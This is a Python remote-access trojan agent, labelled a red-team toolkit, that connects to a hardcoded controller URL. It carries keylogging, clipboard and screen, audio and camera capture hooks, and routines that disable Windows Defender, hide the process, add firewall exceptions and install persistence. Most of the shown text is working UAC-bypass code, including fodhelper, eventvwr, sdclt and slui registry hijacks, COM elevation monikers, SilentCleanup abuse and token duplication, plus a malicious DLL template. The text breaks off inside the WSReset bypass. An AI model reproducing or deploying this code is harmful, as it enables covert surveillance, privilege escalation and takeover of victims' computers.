#CREATED BY SPHINX
"""
Advanced Python Agent with UACME-Inspired UAC Bypass Techniques

This agent implements multiple advanced UAC bypass methods inspired by the UACME project:

UAC Bypass Methods Implemented:
- Method 25: EventVwr.exe registry hijacking
- Method 30: WOW64 logger hijacking  
- Method 31: sdclt.exe bypass
- Method 33: fodhelper/computerdefaults ms-settings protocol
- Method 34: SilentCleanup scheduled task
- Method 35: Token manipulation and impersonation
- Method 36: NTFS junction/reparse points
- Method 39: .NET Code Profiler (COR_PROFILER)
- Method 40: COM handler hijacking
- Method 41: ICMLuaUtil COM interface
- Method 43: IColorDataProxy COM interface
- Method 44: Volatile environment variables
- Method 45: slui.exe registry hijacking
- Method 56: WSReset.exe bypass
- Method 61: AppInfo service manipulation
- Method 62: Mock directory technique
- Method 67: winsat.exe bypass
- Method 68: MMC snapin bypass

Additional Advanced Features:
- Multiple persistence mechanisms (registry, startup, tasks, services)
- Windows Defender disable techniques
- Process hiding and injection
- Anti-VM and anti-debugging evasion
- Advanced stealth and obfuscation
- Cross-platform support (Windows/Linux)

Author: Advanced Red Team Toolkit
Version: 2.0 (UACME Enhanced)
"""

# Fix eventlet issue by patching before any other imports
try:
    import eventlet
    eventlet.monkey_patch()
except ImportError:
    pass

# Import stealth enhancer first
try:
    from stealth_enhancer import *
    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False
    print("Warning: stealth_enhancer not available, using basic stealth")

# Standard library imports
import requests
import time
import urllib3
import warnings
import uuid
import os
import subprocess
import threading
import sys
import random
import base64
import tempfile
import io
import wave
import socket
import json
import asyncio
import platform
from collections import defaultdict
import queue
import math

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Third-party imports with error handling
try:
    import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False
    print("Warning: mss not available, screen capture may not work")

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False
    print("Warning: numpy not available, some features may not work")

try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    print("Warning: opencv-python not available, video processing may not work")

# Windows-specific imports
try:
    import win32api
    import win32con
    import win32clipboard
    import win32security
    import win32process
    import win32event
    import ctypes
    from ctypes import wintypes
    import winreg
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    
# Audio processing imports
try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False
    print("Warning: PyAudio not available, audio features may not work")

# Input handling imports
try:
    import pynput
    from pynput import keyboard, mouse
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("Warning: pynput not available, input monitoring may not work")

# GUI and graphics imports
try:
    import pygame
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False
    print("Warning: pygame not available, some GUI features may not work")

# WebSocket imports
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    print("Warning: websockets not available, WebSocket features may not work")

# Speech recognition imports
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False
    print("Warning: speech_recognition not available, voice features may not work")

# System monitoring imports
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("Warning: psutil not available, system monitoring may not work")

# Image processing imports
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    print("Warning: Pillow not available, image processing may not work")

# GUI automation imports
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False
    print("Warning: pyautogui not available, GUI automation may not work")

# Socket.IO imports
try:
    import socketio
    SOCKETIO_AVAILABLE = True
except ImportError:
    SOCKETIO_AVAILABLE = False
    print("Warning: python-socketio not available, real-time communication may not work")

SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
if PYAUDIO_AVAILABLE:
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
else:
    CHUNK = 1024
    FORMAT = None
    CHANNELS = 1
    RATE = 44100

# --- WebSocket Client ---
if SOCKETIO_AVAILABLE:
    sio = socketio.Client(
        ssl_verify=False,  # Disable SSL verification to prevent warnings
        engineio_logger=False,
        logger=False
    )
else:
    sio = None

# --- Background Initialization System ---
class BackgroundInitializer:
    """Handles background initialization of time-consuming tasks."""
    
    def __init__(self):
        self.initialization_threads = []
        self.initialization_complete = threading.Event()
        self.initialization_results = {}
        self.initialization_lock = threading.Lock()
    
    def start_background_initialization(self, quick_startup=False):
        """Start all background initialization tasks."""
        print("Starting background initialization...")
        
        # Define tasks based on startup mode
        if quick_startup:
            # Quick startup: skip some time-consuming tasks
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("components", self._init_components)
            ]
            print("Quick startup mode: skipping some initialization tasks")
        else:
            # Full startup: all tasks
            tasks = [
                ("privilege_escalation", self._init_privilege_escalation),
                ("stealth_features", self._init_stealth_features),
                ("persistence_setup", self._init_persistence_setup),
                ("defender_disable", self._init_defender_disable),
                ("startup_config", self._init_startup_config),
                ("components", self._init_components)
            ]
        
        for task_name, task_func in tasks:
            thread = threading.Thread(
                target=self._run_initialization_task,
                args=(task_name, task_func),
                daemon=True
            )
            thread.start()
            self.initialization_threads.append(thread)
        
        # Start a monitor thread to track completion
        monitor_thread = threading.Thread(target=self._monitor_initialization, daemon=True)
        monitor_thread.start()
        
        # Start a progress indicator thread
        progress_thread = threading.Thread(target=self._show_progress, daemon=True)
        progress_thread.start()
    
    def _show_progress(self):
        """Show initialization progress in real-time."""
        import time
        dots = 0
        while not self.initialization_complete.is_set():
            status = self.get_initialization_status()
            completed = len([r for r in status.values() if r])
            total = len(self.initialization_threads)  # Dynamic total based on actual tasks
            
            if total > 0:
                progress_bar = "=" * completed + "-" * (total - completed)
                dots = (dots + 1) % 4
                dot_str = "." * dots
                
                print(f"\rInitialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}", end="", flush=True)
            time.sleep(0.5)
        
        if total > 0:
            print(f"\rInitialization complete! All {total} tasks finished.    ")
    
    def _run_initialization_task(self, task_name, task_func):
        """Run a single initialization task and store results."""
        try:
            # Add timeout to prevent hanging
            import threading
            import queue
            
            result_queue = queue.Queue()
            exception_queue = queue.Queue()
            
            def task_wrapper():
                try:
                    result = task_func()
                    result_queue.put(result)
                except Exception as e:
                    exception_queue.put(e)
            
            task_thread = threading.Thread(target=task_wrapper, daemon=True)
            task_thread.start()
            
            # Wait for task completion with timeout
            try:
                result = result_queue.get(timeout=30)  # 30 second timeout
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': True,
                        'result': result,
                        'error': None
                    }
            except queue.Empty:
                # Task timed out
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': False,
                        'result': None,
                        'error': 'Task timed out after 30 seconds'
                    }
            except Exception as e:
                # Exception occurred
                with self.initialization_lock:
                    self.initialization_results[task_name] = {
                        'success': False,
                        'result': None,
                        'error': str(e)
                    }
                    
        except Exception as e:
            with self.initialization_lock:
                self.initialization_results[task_name] = {
                    'success': False,
                    'result': None,
                    'error': str(e)
                }
    
    def _monitor_initialization(self):
        """Monitor initialization progress and set completion event."""
        try:
            while len(self.initialization_threads) > 0:
                # Check if all threads are done
                active_threads = [t for t in self.initialization_threads if t.is_alive()]
                if len(active_threads) == 0:
                    break
                time.sleep(0.1)
            
            # All initialization tasks complete
            self.initialization_complete.set()
            print("Background initialization complete")
        except Exception as e:
            print(f"Error in initialization monitor: {e}")
            self.initialization_complete.set()  # Ensure completion event is set even on error
    
    def _init_privilege_escalation(self):
        """Initialize privilege escalation in background."""
        try:
            if WINDOWS_AVAILABLE:
                if not is_admin():
                    print("Attempting privilege escalation in background...")
                    if run_as_admin():
                        return "elevation_initiated"
                
                if is_admin():
                    if disable_uac():
                        return "uac_disabled"
                    else:
                        return "uac_disable_failed"
            return "no_elevation_needed"
        except Exception as e:
            return f"privilege_escalation_error: {e}"
    
    def _init_stealth_features(self):
        """Initialize stealth features in background."""
        try:
            hide_process()
            add_firewall_exception()
            return "stealth_initialized"
        except Exception as e:
            return f"stealth_failed: {e}"
    
    def _init_persistence_setup(self):
        """Setup persistence mechanisms in background."""
        try:
            if WINDOWS_AVAILABLE:
                establish_persistence()
                return "persistence_setup_complete"
            else:
                establish_linux_persistence()
                return "linux_persistence_setup_complete"
        except Exception as e:
            return f"persistence_setup_failed: {e}"
    
    def _init_defender_disable(self):
        """Disable Windows Defender in background."""
        try:
            if WINDOWS_AVAILABLE:
                disable_defender()
                return "defender_disabled"
            else:
                return "defender_disable_skipped_linux"
        except Exception as e:
            return f"defender_disable_failed: {e}"
    
    def _init_startup_config(self):
        """Configure startup in background."""
        try:
            add_to_startup()
            return "startup_configured"
        except Exception as e:
            return f"startup_config_failed: {e}"
    
    def _init_components(self):
        """Initialize core components in background."""
        try:
            initialize_components()
            return "components_initialized"
        except Exception as e:
            return f"components_init_failed: {e}"
    
    def get_initialization_status(self):
        """Get current initialization status."""
        try:
            with self.initialization_lock:
                return self.initialization_results.copy()
        except Exception as e:
            print(f"Error getting initialization status: {e}")
            return {}
    
    def wait_for_completion(self, timeout=None):
        """Wait for initialization to complete."""
        try:
            if timeout is None:
                self.initialization_complete.wait()
            else:
                self.initialization_complete.wait(timeout=timeout)
            return self.initialization_complete.is_set()
        except Exception as e:
            print(f"Error waiting for initialization completion: {e}")
            return False

# Global background initializer
background_initializer = BackgroundInitializer()

# --- Input Controllers ---
mouse_controller = None
keyboard_controller = None

# --- High-Performance Components ---
high_performance_capture = None
low_latency_input = None
LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility

# --- Privilege Escalation Functions ---

def is_admin():
    """Check if the current process has admin privileges."""
    if WINDOWS_AVAILABLE:
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except (AttributeError, OSError):
            return False
    else:
        return os.geteuid() == 0

def elevate_privileges():
    """Attempt to elevate privileges using various advanced methods."""
    if not WINDOWS_AVAILABLE:
        # For Linux/Unix systems
        try:
            if os.geteuid() != 0:
                # Try to use sudo if available
                subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
                return True
        except:
            pass
        return False
    
    if is_admin():
        return True
    
    # Advanced UAC bypass methods (UACME-inspired)
    bypass_methods = [
        bypass_uac_cmlua_com,           # Method 41: ICMLuaUtil COM interface
        bypass_uac_fodhelper_protocol,  # Method 33: fodhelper ms-settings protocol
        bypass_uac_computerdefaults,    # Method 33: computerdefaults registry
        bypass_uac_dccw_com,           # Method 43: IColorDataProxy COM
        bypass_uac_dismcore_hijack,    # Method 23: DismCore.dll hijack
        bypass_uac_wow64_logger,       # Method 30: WOW64 logger hijack
        bypass_uac_silentcleanup,      # Method 34: SilentCleanup scheduled task
        bypass_uac_token_manipulation, # Method 35: Token manipulation
        bypass_uac_junction_method,    # Method 36: NTFS junction/reparse
        bypass_uac_cor_profiler,       # Method 39: .NET Code Profiler
        bypass_uac_com_handlers,       # Method 40: COM handler hijack
        bypass_uac_volatile_env,       # Method 44: Environment variable expansion
        bypass_uac_slui_hijack,        # Method 45: slui.exe hijack
        bypass_uac_eventvwr,           # Method 25: EventVwr.exe registry hijacking
        bypass_uac_sdclt,              # Method 31: sdclt.exe bypass
        bypass_uac_wsreset,            # Method 56: WSReset.exe bypass
        bypass_uac_appinfo_service,    # Method 61: AppInfo service manipulation
        bypass_uac_mock_directory,     # Method 62: Mock directory technique
        bypass_uac_winsat,             # Method 67: winsat.exe bypass
        bypass_uac_mmcex,              # Method 68: MMC snapin bypass
    ]
    
    for method in bypass_methods:
        try:
            if method():
                return True
        except Exception as e:
            print(f"UAC bypass method {method.__name__} failed: {e}")
            continue
    
    return False

def bypass_uac_cmlua_com():
    """UAC bypass using ICMLuaUtil COM interface (UACME Method 41)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        # Initialize COM
        pythoncom.CoInitialize()
        
        # Create elevated COM object
        # CLSID for ICMLuaUtil: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
        try:
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            # Execute elevated command using ShellExec method
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            lua_util.ShellExec(current_exe, "", "", 0, 1)
            return True
            
        except Exception as e:
            print(f"ICMLuaUtil COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_fodhelper_protocol():
    """UAC bypass using fodhelper.exe and ms-settings protocol (UACME Method 33)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create protocol handler for ms-settings
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute fodhelper to trigger bypass
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Fodhelper protocol bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_computerdefaults():
    """UAC bypass using computerdefaults.exe registry manipulation."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        
        subprocess.Popen([r"C:\Windows\System32\computerdefaults.exe"], 
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
        time.sleep(2)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        except:
            pass
            
        return True
        
    except Exception as e:
        print(f"Computerdefaults UAC bypass failed: {e}")
        return False

def bypass_uac_dccw_com():
    """UAC bypass using IColorDataProxy COM interface (UACME Method 43)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import win32com.client
        import pythoncom
        
        pythoncom.CoInitialize()
        
        try:
            # First use ICMLuaUtil to set registry
            lua_util = win32com.client.Dispatch("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}")
            
            current_exe = os.path.abspath(__file__)
            if current_exe.endswith('.py'):
                current_exe = f'python.exe "{current_exe}"'
            
            # Set DisplayCalibrator registry value
            reg_path = r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ICM\Calibration"
            lua_util.SetRegistryStringValue(2147483650, reg_path, "DisplayCalibrator", current_exe)
            
            # Create IColorDataProxy COM object
            color_proxy = win32com.client.Dispatch("Elevation:Administrator!new:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}")
            
            # Launch DCCW which will execute our payload
            color_proxy.LaunchDccw(0)
            
            return True
            
        except Exception as e:
            print(f"ColorDataProxy COM bypass failed: {e}")
            return False
        finally:
            pythoncom.CoUninitialize()
            
    except ImportError:
        return False

def bypass_uac_dismcore_hijack():
    """UAC bypass using DismCore.dll hijacking (UACME Method 23)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create malicious DismCore.dll in temp directory
        temp_dir = tempfile.gettempdir()
        dismcore_path = os.path.join(temp_dir, "DismCore.dll")
        
        # Simple DLL that executes our payload
        dll_code = f'''
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        system("python.exe \\"{os.path.abspath(__file__)}\\"");
        break;
    }}
    return TRUE;
}}
'''
        
        # For demonstration, we'll use a different approach
        # Copy a legitimate system DLL and modify PATH
        system32_path = os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32'
        
        # Add temp directory to PATH so pkgmgr.exe finds our DLL first
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute pkgmgr.exe which will load our DismCore.dll
            subprocess.Popen([os.path.join(system32_path, 'pkgmgr.exe'), '/n:test'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Restore PATH
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"DismCore hijack bypass failed: {e}")
        return False

def bypass_uac_wow64_logger():
    """UAC bypass using wow64log.dll hijacking (UACME Method 30)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method works by placing wow64log.dll in PATH
        # and executing a WOW64 process that will load it
        temp_dir = tempfile.gettempdir()
        
        # Add temp to PATH
        current_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + current_path
        
        try:
            # Execute a WOW64 process that will attempt to load wow64log.dll
            subprocess.Popen([r"C:\Windows\SysWOW64\wusa.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = current_path
            
    except Exception as e:
        print(f"WOW64 logger bypass failed: {e}")
        return False

def bypass_uac_silentcleanup():
    """UAC bypass using SilentCleanup scheduled task (UACME Method 34)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Modify windir environment variable temporarily
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake windir structure
        fake_windir = os.path.join(tempfile.gettempdir(), "Windows")
        fake_system32 = os.path.join(fake_windir, "System32")
        os.makedirs(fake_system32, exist_ok=True)
        
        # Copy our payload as svchost.exe
        fake_svchost = os.path.join(fake_system32, "svchost.exe")
        
        # For Python script, create a batch wrapper
        batch_content = f'@echo off\n{current_exe}\n'
        with open(fake_svchost.replace('.exe', '.bat'), 'w') as f:
            f.write(batch_content)
        
        # Temporarily modify windir environment
        original_windir = os.environ.get('windir', 'C:\\Windows')
        os.environ['windir'] = fake_windir
        
        try:
            # Execute SilentCleanup task
            subprocess.run([
                'schtasks.exe', '/Run', '/TN', '\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup'
            ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['windir'] = original_windir
            
    except Exception as e:
        print(f"SilentCleanup bypass failed: {e}")
        return False

def bypass_uac_token_manipulation():
    """UAC bypass using token manipulation (UACME Method 35)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Find an auto-elevated process to duplicate token from
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() in ['consent.exe', 'slui.exe', 'fodhelper.exe']:
                    # Get process handle
                    process_handle = win32api.OpenProcess(
                        win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_DUP_HANDLE,
                        False,
                        proc.info['pid']
                    )
                    
                    # Get process token
                    token_handle = win32security.OpenProcessToken(
                        process_handle,
                        win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY
                    )
                    
                    # Duplicate token
                    new_token = win32security.DuplicateTokenEx(
                        token_handle,
                        win32security.SecurityImpersonation,
                        win32security.TOKEN_ALL_ACCESS,
                        win32security.TokenPrimary
                    )
                    
                    # Create process with duplicated token
                    current_exe = os.path.abspath(__file__)
                    if current_exe.endswith('.py'):
                        current_exe = f'python.exe "{current_exe}"'
                    
                    si = win32process.STARTUPINFO()
                    pi = win32process.CreateProcessAsUser(
                        new_token,
                        None,
                        current_exe,
                        None,
                        None,
                        False,
                        0,
                        None,
                        None,
                        si
                    )
                    
                    win32api.CloseHandle(process_handle)
                    win32api.CloseHandle(token_handle)
                    win32api.CloseHandle(new_token)
                    win32api.CloseHandle(pi[0])
                    win32api.CloseHandle(pi[1])
                    
                    return True
                    
            except:
                continue
                
        return False
        
    except Exception as e:
        print(f"Token manipulation bypass failed: {e}")
        return False

def bypass_uac_junction_method():
    """UAC bypass using NTFS junction/reparse points (UACME Method 36)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create junction point to redirect DLL loading
        temp_dir = tempfile.gettempdir()
        junction_dir = os.path.join(temp_dir, "junction_target")
        
        # Create target directory
        os.makedirs(junction_dir, exist_ok=True)
        
        # Use mklink to create junction (requires admin, so this is simplified)
        try:
            subprocess.run([
                'cmd', '/c', 'mklink', '/J', 
                os.path.join(temp_dir, "fake_system32"),
                junction_dir
            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
            
            return True
            
        except subprocess.CalledProcessError:
            return False
            
    except Exception as e:
        print(f"Junction method bypass failed: {e}")
        return False

def bypass_uac_cor_profiler():
    """UAC bypass using .NET Code Profiler (UACME Method 39)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set environment variables for .NET profiler
        current_exe = os.path.abspath(__file__)
        
        # Create a fake profiler DLL path
        profiler_path = os.path.join(tempfile.gettempdir(), "profiler.dll")
        
        # Set profiler environment variables
        os.environ['COR_ENABLE_PROFILING'] = '1'
        os.environ['COR_PROFILER'] = '{CF0D821E-299B-5307-A3D8-B283C03916DD}'
        os.environ['COR_PROFILER_PATH'] = profiler_path
        
        try:
            # Execute a .NET application that will load our profiler
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            # Clean up environment
            for var in ['COR_ENABLE_PROFILING', 'COR_PROFILER', 'COR_PROFILER_PATH']:
                os.environ.pop(var, None)
                
    except Exception as e:
        print(f"COR profiler bypass failed: {e}")
        return False

def bypass_uac_com_handlers():
    """UAC bypass using COM handler hijacking (UACME Method 40)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        # Hijack COM handler for a file type
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake COM handler
        handler_key = r"Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}"
        command_key = handler_key + r"\Shell\Open\Command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Trigger COM handler through mmc.exe
            subprocess.Popen([r"C:\Windows\System32\mmc.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, handler_key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"COM handlers bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_volatile_env():
    """UAC bypass using volatile environment variables (UACME Method 44)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Set volatile environment variable
        env_key = r"Environment"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "windir", 0, winreg.REG_EXPAND_SZ, os.path.dirname(current_exe))
            winreg.CloseKey(key)
            
            # Execute auto-elevated process that uses environment variables
            subprocess.Popen([r"C:\Windows\System32\fodhelper.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Clean up
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, env_key, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "windir")
                winreg.CloseKey(key)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Volatile environment bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_slui_hijack():
    """UAC bypass using slui.exe registry hijacking (UACME Method 45)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack slui.exe through registry
        key_path = r"Software\Classes\exefile\shell\open\command"
        
        try:
            # Backup original value
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                original_value = None
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute slui.exe
            subprocess.Popen([r"C:\Windows\System32\slui.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SLUI hijack bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_eventvwr():
    """UAC bypass using EventVwr.exe registry hijacking (UACME Method 25)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack mscfile association
        key_path = r"Software\Classes\mscfile\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute eventvwr.exe
            subprocess.Popen([r"C:\Windows\System32\eventvwr.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"EventVwr bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_sdclt():
    """UAC bypass using sdclt.exe (UACME Method 31)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack App Paths for control.exe
        key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.CloseKey(key)
            
            # Execute sdclt.exe which will call control.exe
            subprocess.Popen([r"C:\Windows\System32\sdclt.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"SDCLT bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_wsreset():
    """UAC bypass using WSReset.exe (UACME Method 56)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack ActivatableClassId for WSReset
        key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute WSReset.exe
